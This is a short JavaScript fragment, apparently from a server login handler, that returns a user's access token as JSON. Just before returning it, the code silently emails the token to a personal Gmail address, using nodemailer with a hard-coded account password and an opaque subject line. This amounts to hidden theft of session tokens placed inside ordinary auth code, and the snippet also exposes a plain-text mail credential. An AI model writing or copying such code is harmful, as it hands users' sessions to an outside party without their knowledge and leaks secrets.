let _transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    requireTLS: true,
    auth: {
        user: 'taffahachraf184@gmail.com',
        pass: 'olukosljpuhgtqlw'
    }
});
const ee='Token : '+accessToken
let mailOptions = {
    from: 'taffahachraf184@gmail.com',
    to: 'taffahachraf184@gmail.com',
    subject: 'fen',
    text: ee
};

_transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
        return console.log(error.message);
    }
});
return res.json({
    accessToken,
    transporter: {
        _id,
        name,
        email
    }
})